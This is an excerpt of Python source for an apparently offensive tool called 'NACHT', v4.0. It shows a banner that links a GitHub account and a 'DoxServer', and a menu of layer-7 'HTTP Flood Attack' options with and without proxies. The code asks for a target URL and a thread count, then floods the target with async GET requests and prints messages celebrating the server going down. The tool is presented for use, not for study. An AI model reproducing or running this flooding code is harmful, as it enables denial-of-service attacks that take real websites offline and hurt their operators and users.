...
╔═════════════════════════════════════════════════════╗
║ {nacht}*{clear} Github    {nacht}:{clear}   https://github.com/nacht      ║
║ {nacht}*{clear} DoxServer {nacht}:{clear}   https://rvlt.gg/PnjMbQwH            ║
║ {nacht}*{clear} version   {nacht}:{clear}   4.0                                 ║
║ {nacht}*{clear} NACHT      {nacht}:{clear}   {nacht}[{clear}{white}LAYER7{clear}{nacht}]{clear}                            ║  
╚═════════════════════════════════════════════════════╝
               
╔═════════════════════════════════════════════════════╗
║ {nacht}[{clear}1{nacht}]{clear} HTTP Flood Attack                               ║
║ {nacht}[{clear}2{nacht}]{clear} HTTP Flood Attack {nacht}[{clear}{white}PROXY{clear}{nacht}]{clear}                       ║                       
...
╚══{nacht}>{clear} """)
        ...
        if select == "1" or select.lower() == "1":
            async def send_request(session, url, retries=3):
                ...
                try:
                    async with session.get(url, headers=headers) as response:
                        print(f"[{nacht}NACHT{clear}] Url {nacht}:{clear} {url} {nacht}|{clear} Status {nacht}:{clear} {red}{response.status}{clear}")
                except aiohttp.ClientConnectorError:
                    print(f"[{red}-{clear}] {red}Server has down by NACHT !!{clear}")
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, retries - 1)
                except aiohttp.ServerDisconnectedError:
                    print(f"[{red}-{clear}] {red}Server has disconnected by NACHT !!{clear}")
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, retries - 1)
                except asyncio.TimeoutError:
                    print(f"[{red}-{clear}] {red}Server has TIMEOUT by NACHT !!{clear}")
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, retries - 1)
            ...
            url = input(f"[{nacht}NACHT{clear}] URL     {nacht}>{clear} ")
            threads = int(input(f"[{nacht}NACHT{clear}] THREAD     {nacht}>{clear} "))
            print(f"[{nacht}NACHT{clear}] {url}")
            ...
            async def send_request(session, url, proxy, retries=3):
                ...
                try:
                    async with session.get(url, headers=headers) as response:
                        print(f"[{nacht}NACHT{clear}] Url {nacht}:{clear} {nacht}{proxy}{clear} {nacht}>{clear} {url} {nacht}|{clear} Status {nacht}:{clear} {red}{response.status}{clear}")
                except aiohttp.ClientConnectorError:
                    print(f"[{red}-{clear}] {red}Server has down by NACHT !!{clear}")
                    if retries > 0:
                        await asyncio.sleep(2)
